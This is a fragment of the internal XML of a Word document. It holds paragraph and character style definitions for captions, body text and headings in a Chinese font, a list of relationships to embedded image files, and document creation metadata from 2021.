  <w:style w:type="paragraph" w:customStyle="1" w:styleId="19">
    <w:name w:val="Table caption|1"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="18"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="20">
    <w:name w:val="Body text|5_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="21"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:smallCaps/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="21">
    <w:name w:val="Body text|5"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="20"/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:ind w:left="1410"/>
    </w:pPr>
    <w:rPr>
      <w:smallCaps/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="22">
    <w:name w:val="Table of contents|1_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="23"/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="23">
    <w:name w:val="Table of contents|1"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="22"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:ind w:firstLine="90"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="24">
    <w:name w:val="Picture caption|1_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="25"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="25">
    <w:name w:val="Picture caption|1"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="24"/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="26">
    <w:name w:val="Heading #3|1_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="27"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="27">
    <w:name w:val="Heading #3|1"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="26"/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:spacing w:after="320"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="28">
    <w:name w:val="Heading #2|2_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="29"/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="34"/>
      <w:szCs w:val="34"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="29">
    <w:name w:val="Heading #2|2"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="28"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:spacing w:line="667" w:lineRule="exact"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="34"/>
      <w:szCs w:val="34"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="30">
    <w:name w:val="Body text|2_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="31"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="31">
    <w:name w:val="Body text|2"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="30"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:spacing w:after="280" w:line="625" w:lineRule="exact"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="32">
    <w:name w:val="Body text|3_"/>
    <w:basedOn w:val="3"/>
    <w:link w:val="33"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="none"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="33">
    <w:name w:val="Body text|3"/>
    <w:basedOn w:val="1"/>
    <w:link w:val="32"/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      <w:spacing w:after="80"/>
      <w:ind w:firstLine="400"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>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5.jpeg"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.jpe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endnotes" Target="endnotes.xml"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.jpeg"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.jpeg"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.jpeg"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.jpeg"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.jpeg"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.jpeg"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.jpeg"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.jpeg"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.jpe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2021-02-22T08:56:00Z</dcterms:created>
  <dc:creator>Administrator</dc:creator>
  <cp:lastModifiedBy>Yt</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-02-22T08:56:06Z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